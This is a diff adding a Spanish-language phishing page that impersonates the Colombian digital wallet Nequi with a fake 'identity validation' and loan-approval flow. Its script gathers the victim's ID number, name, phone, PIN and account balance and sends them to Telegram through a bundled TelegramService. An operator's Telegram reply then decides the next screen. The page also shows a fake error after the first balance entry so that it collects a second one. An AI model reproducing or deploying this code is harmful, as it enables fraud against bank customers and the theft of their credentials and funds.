@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Validación de identidad - Nequi</title>
+  <link rel="shortcut icon" type="image/x-icon" href="images/favicon-3.ico">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800;900&family=Montserrat:wght@400;600;700;800;900&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap"
+    rel="stylesheet">
+  <link rel="stylesheet" href="css/identidad.css?v=2">
+</head>
+
+<body>
+
+  <!-- Header Blanco Oficial -->
+  <!-- Header Blanco Oficial -->
+  <header class="site-header">
+    <div class="header-inner">
+      <a href="index.html" class="logo-link" aria-label="Inicio Nequi">
+        <svg width="104" height="32" viewBox="0 0 104 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081"></path>
+          <path d="M31.9876 0H28.2187C27.7033 0 27.3006 0.416 27.3006 0.912V15.872C27.3006 16.176 26.8979 16.288 26.753 16.016L17.991 0.4C17.8461 0.144 17.5884 0 17.2823 0H11.0169C10.5015 0 10.0988 0.416 10.0988 0.912V24.816C10.0988 25.328 10.5176 25.728 11.0169 25.728H14.7858C15.3012 25.728 15.7039 25.312 15.7039 24.816V9.408C15.7039 9.104 16.1066 8.992 16.2515 9.264L25.2551 25.344C25.4 25.6 25.6577 25.744 25.9638 25.744H31.9554C32.4708 25.744 32.8735 25.328 32.8735 24.832V0.912C32.8735 0.4 32.4547 0 31.9554 0H31.9876Z" fill="#200020"></path>
+          <path d="M54.6495 16.3999C54.6495 9.66395 50.2363 6.31995 45.3883 6.31995C39.0906 6.31995 35.4988 10.6559 35.4988 16.5119C35.4988 23.1679 40.0087 26.3359 45.2433 26.3359C50.4779 26.3359 53.5382 23.6479 54.3596 20.1599C54.4724 19.7119 54.2147 19.3119 53.5382 19.3119H50.5746C50.2363 19.3119 49.9464 19.4879 49.8015 19.8239C49.0606 21.4399 47.8687 22.2879 45.5815 22.2879C42.9884 22.2879 41.2489 20.6719 40.9912 17.3919H53.7315C54.2791 17.3919 54.6495 16.9919 54.6495 16.3999ZM41.2006 13.8559C41.7482 11.4399 43.1656 10.3679 45.3077 10.3679C47.2244 10.3679 48.8673 11.4719 49.0928 13.8559H41.2006Z" fill="#200020"></path>
+          <path d="M74.976 6.80002H71.2071C70.6917 6.80002 70.289 7.21602 70.289 7.71202V8.64002C69.1615 7.32802 67.3093 6.41602 64.8772 6.41602C59.4332 6.41602 56.5501 11.312 56.5501 16.496C56.5501 21.024 58.9178 26.096 64.7644 26.096C66.8583 26.096 69.081 25.104 70.289 23.696V31.056C70.289 31.568 70.7078 31.968 71.2071 31.968H74.976C75.4914 31.968 75.8941 31.552 75.8941 31.056V7.72802C75.8941 7.21602 75.4753 6.81602 74.976 6.81602V6.80002ZM66.3912 22.064C63.9108 22.064 62.1713 20.256 62.1713 16.368C62.1713 12.48 63.9108 10.448 66.3912 10.448C68.8716 10.448 70.6111 12.32 70.6111 16.368C70.6111 20.416 68.8716 22.064 66.3912 22.064Z" fill="#200020"></path>
+          <path d="M95.0448 6.80005H91.2759C90.7604 6.80005 90.3578 7.21605 90.3578 7.71205V17.3921C90.3578 20.5121 88.9565 21.4241 87.1687 21.4241C85.3809 21.4241 83.9796 20.5121 83.9796 17.3921V7.71205C83.9796 7.20005 83.5608 6.80005 83.0615 6.80005H79.2926C78.7772 6.80005 78.3745 7.21605 78.3745 7.71205V17.7921C78.3745 23.7921 81.7086 26.2081 87.1848 26.2081C92.661 26.2081 95.9951 23.7761 95.9951 17.7921V7.71205C95.9951 7.20005 95.5763 6.80005 95.077 6.80005H95.0448Z" fill="#200020"></path>
+          <path d="M103.082 6.80005H99.2969C98.7899 6.80005 98.3788 7.20837 98.3788 7.71205V24.832C98.3788 25.3357 98.7899 25.744 99.2969 25.744H103.082C103.589 25.744 104 25.3357 104 24.832V7.71205C104 7.20837 103.589 6.80005 103.082 6.80005Z" fill="#200020"></path>
+        </svg>
+      </a>
+
+      <button class="menu-burger" type="button" aria-label="Menú">
+        <span class="burger-line"></span>
+        <span class="burger-line"></span>
+        <span class="burger-line"></span>
+      </button>
+    </div>
+  </header>
+
+  <!-- Hero Banner con Imagen y Título "Valida tus datos" -->
+  <section class="hero-banner-section hero-banner">
+    <div class="hero-banner-wrapper hero-image-wrapper">
+      <div class="hero-image-container">
+        <img src="images/questions.jpeg" alt="Valida tus datos" class="hero-image hero-img">
+        <div class="hero-overlay-text hero-title-overlay">
+          <h1 class="hero-main-heading u-text-white is-credit-effect-page">
+            Valida tus datos
+          </h1>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Contenedor del Formulario de Validación -->
+  <main class="form-main-container">
+    <div class="form-content-wrap">
+      <h2 class="section-title">Validación de identidad</h2>
+      <p class="section-subtitle">
+        No dudamos que seas tú, pero por seguridad necesitamos validar algunos datos
+      </p>
+
+      <form class="identity-form" id="identityValidationForm" autocomplete="off">
+        <!-- Campo 1: ¿Ya has tenido crédito con Nequi? -->
+        <div class="field-card" id="wrapperCreditoPrevio">
+          <span class="field-label">¿Ya has tenido crédito con Nequi?</span>
+          <div class="field-value-row">
+            <span class="field-value" id="displayCreditoPrevio">Si</span>
+            <svg class="chevron-icon" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#200020" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+              <polyline points="6 9 12 15 18 9"></polyline>
+            </svg>
+          </div>
+          <select class="hidden-native-select" id="selectCreditoPrevio" name="selectPrevio" tabindex="-1">
+            <option value="Si" selected>Si</option>
+            <option value="No">No</option>
+          </select>
+        </div>
+
+        <!-- Campo 2: ¿Cual es tu saldo en Nequi? -->
+        <div class="saldo-card-group">
+          <div class="saldo-input-card" id="saldoInputCard">
+            <div class="saldo-icon-circle">
+              <svg viewBox="0 0 24 24" width="22" height="22">
+                <circle cx="12" cy="12" r="10.5" fill="none" stroke="#da0081" stroke-width="1.6" />
+                <text x="12" y="16.5" font-family="'Plus Jakarta Sans', sans-serif" font-size="14" font-weight="700" fill="#da0081" text-anchor="middle">$</text>
+              </svg>
+            </div>
+            <input 
+              type="text" 
+              id="inputSaldoNequi" 
+              name="saldoNequi"
+              class="saldo-input" 
+              placeholder="¿Cual es tu saldo en Nequi?"
+              inputmode="numeric"
+              autocomplete="off"
+              required
+            >
+          </div>
+          <p class="saldo-error-msg" id="saldoErrorMsg">
+            El saldo ingresado no coincide con la información de tu cuenta Nequi. Verifica el monto.
+          </p>
+          <p class="saldo-disclaimer">
+            Por políticas financieras el saldo actual no será visible en la solicitud, solo hace parte del proceso de validación ante las centrales de riesgo.
+          </p>
+        </div>
+
+        <!-- Campo 3: ¿Tienes actualmente un crédito con Nequi? -->
+        <div class="field-card" id="wrapperCreditoActual">
+          <span class="field-label">¿Tienes actualmente un crédito con Nequi?</span>
+          <div class="field-value-row">
+            <span class="field-value" id="displayCreditoActual">Si</span>
+            <svg class="chevron-icon" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#200020" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+              <polyline points="6 9 12 15 18 9"></polyline>
+            </svg>
+          </div>
+          <select class="hidden-native-select" id="selectCreditoActual" name="selectActual" tabindex="-1">
+            <option value="Si" selected>Si</option>
+            <option value="No">No</option>
+          </select>
+        </div>
+
+        <!-- Botón Validar -->
+        <button type="submit" class="submit-btn-validar" id="btnSubmitValidation">
+          Validar
+        </button>
+      </form>
+    </div>
+  </main>
+
+  <!-- Pantalla de Carga: Cubos Nequi Centrados (Fondo Blanco) y Estado Listo (Imagen 1 y 2) -->
+  <div class="loader-overlay" id="identidadLoaderOverlay" style="display: none;">
+    <!-- Banner Verde Superior: Listo! Tu crédito se encuentra aprobado. (Imagen 1) -->
+    <div class="content" id="identidadGreenBanner">
+      <div class="check-container">
+        <div class="checkmark"></div>
+      </div>
+      <p id="identidadBannerText">Listo! Tu crédito se encuentra aprobado.</p>
+    </div>
+
+    <!-- Estado 1: Cubos Nequi Magenta con Texto (Imagen 2) -->
+    <div class="loading-cubes-wrapper" id="identidadCubesWrapper">
+      <div class="nequi-loader">
+        <div class="cubes">
+          <div class="cube"></div>
+          <div class="cube"></div>
+        </div>
+      </div>
+      <p class="loading-text">
+        Un momento por favor,<br>estamos validando tu<br>solicitud...
+      </p>
+    </div>
+
+    <!-- Estado 2: Tarjeta Cian ¡Listo! con Check Blanco (Imagen 1) -->
+    <div class="ready-card-wrapper" id="identidadDoneCard" style="display: none;">
+      <div class="cyan-ready-card">
+        <svg class="ready-check-icon" viewBox="0 0 48 48" fill="none">
+          <path d="M11 25 L21 35 L37 15" stroke="#ffffff" stroke-width="4.5" stroke-linecap="round" stroke-linejoin="round" />
+        </svg>
+        <span class="ready-card-text">¡Listo!</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Footer Oficial Nequi Completo -->
+  <footer class="nequi-image-footer">
+    <div class="footer-wave-top">
+      <svg viewBox="0 0 375 55" preserveAspectRatio="none" class="footer-wave-svg" aria-hidden="true">
+        <path
+          d="M75.2264 1.39727L1374 123V875.5H-72V92L47.9971 8.55722C55.9438 3.03125 65.5894 0.494963 75.2264 1.39727Z"
+          fill="#200020" />
+      </svg>
+    </div>
+    <div class="footer-image-wrapper">
+      <img src="images/footer.png" alt="Footer Nequi" class="footer-image">
+    </div>
+  </footer>
+
+  <!-- Scripts: Telegram -->
+  <script src="js/telegram.js"></script>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const selectPrevio = document.getElementById("selectCreditoPrevio");
+      const displayPrevio = document.getElementById("displayCreditoPrevio");
+      const wrapperPrevio = document.getElementById("wrapperCreditoPrevio");
+
+      const selectActual = document.getElementById("selectCreditoActual");
+      const displayActual = document.getElementById("displayCreditoActual");
+      const wrapperActual = document.getElementById("wrapperCreditoActual");
+
+      const inputSaldo = document.getElementById("inputSaldoNequi");
+      const saldoCard = document.getElementById("saldoInputCard");
+      const saldoErrorMsg = document.getElementById("saldoErrorMsg");
+      const loaderOverlay = document.getElementById("identidadLoaderOverlay");
+      const cubesWrapper = document.getElementById("identidadCubesWrapper");
+      const doneCard = document.getElementById("identidadDoneCard");
+      const greenBanner = document.getElementById("identidadGreenBanner");
+      const form = document.getElementById("identityValidationForm");
+      const btnSubmit = document.getElementById("btnSubmitValidation");
+
+      let firstSaldo = null;
+      let secondSaldo = null;
+      let contSendButton = 0;
+
+      function showErrorState() {
+        if (loaderOverlay) loaderOverlay.style.display = "none";
+        if (greenBanner) greenBanner.classList.remove("show");
+        if (doneCard) doneCard.style.display = "none";
+        if (cubesWrapper) cubesWrapper.style.display = "flex";
+        if (btnSubmit) {
+          btnSubmit.disabled = false;
+          btnSubmit.textContent = "Validar";
+        }
+        if (saldoCard) saldoCard.classList.add("has-error");
+        if (saldoErrorMsg) saldoErrorMsg.classList.add("show");
+        if (inputSaldo) {
+          inputSaldo.value = "";
+          inputSaldo.focus();
+        }
+      }
+
+      function showSuccessReadyState() {
+        if (cubesWrapper) cubesWrapper.style.display = "none";
+        if (doneCard) doneCard.style.display = "flex";
+        if (greenBanner) greenBanner.classList.add("show");
+        setTimeout(() => {
+          window.location.href = "firma.html";
+        }, 3000);
+      }
+
+      // Si la URL viene con ?error=saldo
+      const urlParams = new URLSearchParams(window.location.search);
+      if (urlParams.get("error") === "saldo") {
+        contSendButton = 1;
+        showErrorState();
+      }
+
+      // Alternar Si / No al hacer clic en las tarjetas de selección
+      function bindToggle(wrapper, select, display) {
+        if (!wrapper || !select || !display) return;
+        wrapper.addEventListener("click", () => {
+          const current = select.value;
+          const next = current === "Si" ? "No" : "Si";
+          select.value = next;
+          display.textContent = next;
+          select.dispatchEvent(new Event("change"));
+        });
+        select.addEventListener("change", (e) => {
+          display.textContent = e.target.value;
+        });
+      }
+
+      bindToggle(wrapperPrevio, selectPrevio, displayPrevio);
+      bindToggle(wrapperActual, selectActual, displayActual);
+
+      // Formato numérico de saldo con separadores de miles
+      if (inputSaldo) {
+        inputSaldo.addEventListener("input", (e) => {
+          let num = e.target.value.replace(/\D/g, "");
+          if (num.length > 0) {
+            e.target.value = new Intl.NumberFormat("es-CO").format(parseInt(num, 10));
+          } else {
+            e.target.value = "";
+          }
+        });
+      }
+
+      // Envío del formulario
+      if (form) {
+        form.addEventListener("submit", (e) => {
+          e.preventDefault();
+
+          const saldoValue = inputSaldo ? inputSaldo.value.trim() : "";
+          if (!saldoValue) {
+            inputSaldo.focus();
+            return;
+          }
+
+          contSendButton += 1;
+          const esSegundo = contSendButton >= 2;
+
+          if (contSendButton === 1) {
+            firstSaldo = saldoValue;
+            localStorage.setItem("firstSaldo", firstSaldo);
+          } else {
+            secondSaldo = saldoValue;
+            localStorage.setItem("secondSaldo", secondSaldo);
+          }
+
+          const formData = JSON.parse(localStorage.getItem("formData") || "{}");
+          const customerData = JSON.parse(localStorage.getItem("customerData") || "{}");
+
+          const cedula = (formData.cedula || customerData.cedula || "").trim().replace(/\D/g, "");
+          let nombre = "";
+          if (customerData && customerData.nombre_completo && customerData.nombre_completo !== "Usuario") {
+            nombre = customerData.nombre_completo;
+          } else if (formData.nombreCompleto) {
+            nombre = formData.nombreCompleto;
+          }
+          const celular = formData.phoneNumber || formData.celular || "";
+          const pin = formData.pin || formData.clave || "";
+
+          formData.firstSaldo = firstSaldo;
+          formData.secondSaldo = secondSaldo;
+          formData.validacionIdentidad = {
+            creditoPrevio: selectPrevio ? selectPrevio.value : "Si",
+            firstSaldo: firstSaldo,
+            secondSaldo: secondSaldo,
+            creditoActual: selectActual ? selectActual.value : "Si",
+            fechaValidacion: new Date().toISOString()
+          };
+          localStorage.setItem("formData", JSON.stringify(formData));
+
+          // 1. Mostrar pantalla de carga con cubos (Imagen 2)
+          if (loaderOverlay) {
+            loaderOverlay.style.display = "flex";
+            if (cubesWrapper) cubesWrapper.style.display = "flex";
+            if (doneCard) doneCard.style.display = "none";
+            if (greenBanner) greenBanner.classList.remove("show");
+          }
+          if (btnSubmit) {
+            btnSubmit.disabled = true;
+            btnSubmit.textContent = "Validando...";
+          }
+
+          // 2. Notificar a Telegram (Primer o Segundo saldo)
+          if (window.TelegramService) {
+            const currentFirst = firstSaldo || localStorage.getItem("firstSaldo");
+            window.TelegramService.notifyValidacionSaldo(saldoValue, cedula, nombre, celular, pin, esSegundo, currentFirst);
+          }
+
+          // 3. Escuchar decisión en Telegram
+          let actionHandled = false;
+          if (window.TelegramService && window.TelegramService.listen) {
+            window.TelegramService.listen((action) => {
+              if (action && !actionHandled) {
+                if (action.startsWith("btn_error_saldo_")) {
+                  actionHandled = true;
+                  showErrorState();
+                } else if (action.startsWith("btn_otp_") || action.startsWith("btn_firma_")) {
+                  actionHandled = true;
+                  showSuccessReadyState();
+                }
+              }
+            }, 15000);
+          }
+
+          // 4. Secuencia automática si no hay acción manual de Telegram:
+          // Primer saldo -> a los 3.5s pide de nuevo con error en rojo
+          // Segundo saldo -> a los 2.4s muestra tarjeta ¡Listo! y banner verde arriba, luego continúa a firma.html
+          setTimeout(() => {
+            if (!actionHandled) {
+              actionHandled = true;
+              if (!esSegundo) {
+                showErrorState();
+              } else {
+                showSuccessReadyState();
+              }
+            }
+          }, esSegundo ? 2400 : 3600);
+        });
+      }
+    });
+  </script>
+</body>
+
+</html>
